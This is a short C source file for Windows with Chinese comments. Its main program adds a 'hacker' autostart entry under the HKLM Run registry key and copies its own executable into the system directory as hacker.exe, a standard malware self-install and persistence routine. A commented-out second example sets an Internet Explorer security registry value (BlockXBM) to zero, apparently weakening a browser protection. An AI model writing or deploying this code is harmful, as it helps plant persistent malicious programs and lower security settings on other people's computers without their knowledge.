#include <stdio.h>
#include <windows.h>

int main(void) {
    char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hkResult;
    int ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hkResult);

    ret = RegSetValueEx(hkResult, "hacker", 0, REG_EXPAND_SZ, (unsigned char *) "%systemroot%\\hacker.exe", 25);
    if (ret == 0) {
        printf("success to write run key\n");
        RegCloseKey(hkResult);
    } else {
        printf("failed to open regedit.%d\n", ret);
        return 0;
    }
    char modlepath[256];
    char syspath[256];
    GetModuleFileName(0, modlepath, 256);//取得程序名字
    GetSystemDirectory(syspath, 256);
    ret = CopyFile(modlepath, strcat(syspath, "\\hacker.exe"), 1);
    if (ret) {
        printf("%s has been copyed to sys dir%s\n", modlepath, syspath);
    } else printf("%s is exisis", modlepath);
    return 0;
}

// 例子2：
//
// #include <windows.h >
// #include <stdio.h >
//
// void main() {
//     HKEY hKey;
//     char SubKeyName[] = "SOFTWARE\\Microsoft\\Internet              Explorer\\Security";
//     char ValueName[] = "BlockXBM";
//
//     BYTE ValueData[64];
//     DWORD Buffer;
//
//     //打开
//     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKeyName, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
//         printf("Error:              Regedit              cannot              be              opened!");
//     } else {
//         //读原来的键值
//         Buffer = sizeof(ValueData);
//         if (RegQueryValueEx(hKey, ValueName, 0, NULL, ValueData, &Buffer) != ERROR_SUCCESS) {
//             //不存在
//             //新建一个值为0的DWORD
//             DWORD temp = 0;
//             if (RegSetValueEx(hKey, ValueName, 0, REG_DWORD, (LPBYTE) &temp, sizeof(DWORD)) != ERROR_SUCCESS) {
//                 printf("Error:              Create              Value              failed");
//             }
//             RegCloseKey(hKey);
//         } else {
//             //存在
//             //改变值
//             DWORD temp = 0;
//             if (RegSetValueEx(hKey, ValueName, 0, REG_DWORD, (LPBYTE) &temp, sizeof(DWORD)) != ERROR_SUCCESS) {
//                 printf("Error:              Change              Value              failed");
//                 RegCloseKey(hKey);
//             }
//         }
//     }
// }
//